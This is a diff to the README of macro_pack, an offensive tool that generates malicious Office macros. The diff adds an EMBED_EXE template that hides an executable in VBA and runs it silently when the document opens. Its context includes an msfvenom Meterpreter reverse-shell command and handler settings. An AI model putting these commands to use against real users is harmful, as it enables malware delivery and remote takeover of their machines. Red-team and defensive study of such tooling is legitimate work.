@@ -165,7 +165,7 @@ msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  macr
         Note that macro_pack will automatically detect AutoOpen, Workbook_Open, or Document_Open  as the start function
         
     -t, --template=TEMPLATE_NAME    Use VBA template already included in macro_pack.exe.
-        Available templates are: HELLO, DROPPER, DROPPER2, DROPPER_PS, METERPRETER 
+        Available templates are: HELLO, DROPPER, DROPPER2, DROPPER_PS, METERPRETER, EMBED_EXE 
         Help for template usage: macro_pack.exe -t help
          
     -v, --vba-output=VBA_FILE_PATH Output generated vba macro (text format) to given path. 
@@ -242,7 +242,7 @@ Give this template the IP and PORT of listening mfsconsole
 Recommended msfconsole options (use exploit/multi/handler):
 ```
 set PAYLOAD windows/meterpreter/reverse_tcp
-set AutoRunScript post/windows/manage/migrate/smart_migrate
+set AutoRunScript post/windows/manage/smart_migrate
 set EXITFUNC thread
 set EnableUnicodeEncoding true
 set EnableStageEncoding true
@@ -250,7 +250,15 @@ set ExitOnSession false
 ```
 
 Warning: This is a 32 bit meterpreter so it will crash Office if Office 64bit is installed!
-  
+
+
+### EMBED_EXE
+Will encode an executable inside the vba. When macro is played, exe will be decoded and executed (hidden) on file system.
+This template is inspired by https://github.com/khr0x40sh/MacroShop
+Give this template the path to exe you want to embed in vba and, optionaly, the path where exe should be extracted
+If extraction path is not given, exe will be extracted with random name in current path. 
+ -> Example1: ```echo "path\\to\my_exe.exe" | macro_pack.exe  -t EMBED_EXE -o -X my_exe.xlsm```
+ -> Example2: ```echo "path\\to\my_exe.exe" "D:\\another\path\your_exe.exe" | macro_pack.exe  -t EMBED_EXE -o -X my_exe.xlsm```
 
 
 ## Efficiency
